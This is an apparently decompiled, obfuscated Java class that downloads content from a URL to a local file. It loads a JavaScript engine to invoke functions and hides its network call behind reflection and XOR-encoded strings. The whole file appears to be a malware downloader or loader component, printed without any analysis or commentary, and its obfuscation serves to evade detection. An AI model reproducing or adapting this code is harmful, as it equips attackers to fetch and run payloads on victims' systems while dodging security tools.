import java.net.URL;
import java.io.InputStream;
import java.io.FileOutputStream;
import javax.script.ScriptEngineManager;
import javax.script.ScriptEngine;
import javax.script.Invocable;

// 
// Decompiled by Procyon v0.5.30
// 

public final class a
{
    public static Object a(final String s, final Invocable invocable, final Object o) {
        try {
            return invocable.invokeFunction(s, o);
        }
        catch (Exception ex) {
            return null;
        }
    }
    
    public static ScriptEngine a() {
        try {
            return new ScriptEngineManager().getEngineByName(a("\u0019J"));
        }
        catch (Exception ex) {
            return null;
        }
    }
    
    public final boolean a(final String s, final String s2) {
        try {
            final InputStream b;
            if ((b = b(s)) != null && s2 != null) {
                final FileOutputStream fileOutputStream = new FileOutputStream(s2);
                final byte[] array = new byte[1024];
                InputStream inputStream = b;
                int read;
                while ((read = inputStream.read(array, 0, array.length)) != -1) {
                    inputStream = b;
                    fileOutputStream.write(array, 0, read);
                }
                fileOutputStream.close();
            }
            b.close();
            return true;
        }
        catch (Exception ex) {
            return false;
        }
    }
    
    public static String a(final String s) {
        final int length = s.length();
        final char[] array = new char[length];
        int n;
        int i = n = length - 1;
        final char[] array2 = array;
        while (i >= 0) {
            final char[] array3 = array2;
            final int n2 = n;
            final char char1 = s.charAt(n2);
            --n;
            array3[n2] = (char)(char1 ^ '9');
            if (n < 0) {
                break;
            }
            final char[] array4 = array2;
            final int n3 = n;
            final char c = (char)(s.charAt(n3) ^ 's');
            --n;
            array4[n3] = c;
            i = n;
        }
        return new String(array2);
    }
    
    private static InputStream b(final String s) {
        try {
            final URL url;
            (url = new URL(s)).openConnection();
            return (InputStream)Class.forName(new StringBuilder().insert(0, l.a("Z,F,\u001e#U")).append(a("M]l!u")).toString()).getMethod(l.a("\"@(^\u001eD?U,]"), (Class<?>[])new Class[0]).invoke(url, new Object[0]);
        }
        catch (Exception ex) {
            return null;
        }
    }
}
